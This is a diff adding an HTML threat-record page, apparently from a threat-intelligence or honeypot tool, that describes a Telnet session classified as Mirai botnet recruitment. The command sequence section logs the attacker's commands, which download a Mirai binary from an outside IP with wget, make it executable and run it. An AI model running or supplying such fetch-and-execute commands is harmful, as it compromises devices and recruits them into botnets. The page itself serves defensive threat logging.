@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Aletheia — Threat Record d91fa04c7e12</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: #0f1117;
+    color: #e6e6e6;
+    margin: 0;
+    padding: 40px 20px;
+  }
+  .card {
+    max-width: 780px;
+    margin: 0 auto;
+    background: #161925;
+    border-radius: 14px;
+    padding: 32px;
+    box-shadow: 0 8px 30px rgba(0,0,0,0.4);
+    border: 1px solid #262a3a;
+  }
+  .header {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    border-bottom: 1px solid #262a3a;
+    padding-bottom: 20px;
+    margin-bottom: 24px;
+  }
+  .header h1 {
+    font-size: 20px;
+    margin: 0 0 4px 0;
+    color: #ffffff;
+  }
+  .header .subtitle {
+    color: #8a8fa3;
+    font-size: 13px;
+  }
+  .severity-badge {
+    background: #8e24aa;
+    color: white;
+    padding: 6px 16px;
+    border-radius: 20px;
+    font-weight: 600;
+    font-size: 13px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    white-space: nowrap;
+  }
+  .section { margin-bottom: 24px; }
+  .section-title {
+    font-size: 12px;
+    text-transform: uppercase;
+    letter-spacing: 0.8px;
+    color: #6b7086;
+    margin-bottom: 10px;
+    font-weight: 600;
+  }
+  .attack-type {
+    font-size: 24px;
+    font-weight: 700;
+    color: #ffffff;
+    margin-bottom: 12px;
+  }
+  .tag {
+    display: inline-block;
+    padding: 4px 10px;
+    border-radius: 6px;
+    font-size: 12px;
+    font-family: 'Consolas', monospace;
+    margin-right: 6px;
+    margin-bottom: 6px;
+  }
+  .attck-tag {
+    background: #262a3a;
+    color: #7cb9ff;
+    border: 1px solid #33395a;
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 16px;
+  }
+  .stat-box {
+    background: #1c2032;
+    border-radius: 8px;
+    padding: 14px 16px;
+    border: 1px solid #262a3a;
+  }
+  .stat-label { font-size: 11px; color: #6b7086; margin-bottom: 4px; }
+  .stat-value { font-size: 16px; color: #ffffff; font-weight: 600; }
+  .command-line {
+    font-family: 'Consolas', monospace;
+    font-size: 13px;
+    color: #a8ffb0;
+    background: #0d0f16;
+    padding: 6px 12px;
+    border-radius: 4px;
+    margin-bottom: 4px;
+  }
+  .command-line.muted { color: #6b7086; }
+  .hash-box {
+    font-family: 'Consolas', monospace;
+    font-size: 12px;
+    color: #ffd479;
+    background: #1c2032;
+    padding: 14px 16px;
+    border-radius: 8px;
+    word-break: break-all;
+    border: 1px solid #33395a;
+  }
+  .footer-note {
+    font-size: 11px;
+    color: #6b7086;
+    margin-top: 24px;
+    padding-top: 16px;
+    border-top: 1px solid #262a3a;
+  }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="header">
+      <div>
+        <h1>Threat Record</h1>
+        <div class="subtitle">Session d91fa04c7e12 &middot; Node node-blr-01 &middot; TELNET</div>
+      </div>
+      <div class="severity-badge">critical</div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Classification</div>
+      <div class="attack-type">Botnet Recruitment</div>
+      <span class="tag attck-tag">T1071</span><span class="tag attck-tag">T1584</span><span class="tag attck-tag">T1059.004</span><span class="tag attck-tag">T1105</span><span class="tag attck-tag">T1082</span>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Session Overview</div>
+      <div class="grid">
+        <div class="stat-box">
+          <div class="stat-label">Source IP</div>
+          <div class="stat-value">198.51.100.23</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-label">Duration</div>
+          <div class="stat-value">33.8s</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-label">Credential Attempts</div>
+          <div class="stat-value">2 (1 successful)</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-label">Files Downloaded</div>
+          <div class="stat-value">1</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Command Sequence</div>
+      <div class="command-line">$ cat /proc/mounts</div><div class="command-line">$ /bin/busybox wget http://185.199.108.44/mirai.arm -O /tmp/.mirai</div><div class="command-line">$ chmod +x /tmp/.mirai</div><div class="command-line">$ /tmp/.mirai</div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">External Enrichment</div>
+      <div class="grid">
+        <div class="stat-box">
+          <div class="stat-label">AbuseIPDB Confidence</div>
+          <div class="stat-value">88/100</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-label">GreyNoise Classification</div>
+          <div class="stat-value">noise</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="section-title">Blockchain-Ready Hash (SHA-256)</div>
+      <div class="hash-box">7173ff2154fcd1ac8bef299c695fb4b29648286a7c872864a9aa6235ec78a691</div>
+    </div>
+
+    <div class="footer-note">
+      Aletheia &mdash; Federated Threat Intelligence Verification &middot; Enrichment values are simulated (mock AbuseIPDB/GreyNoise); classification and hashing are real, tested pipeline logic.
+    </div>
+  </div>
+</body>
+</html>
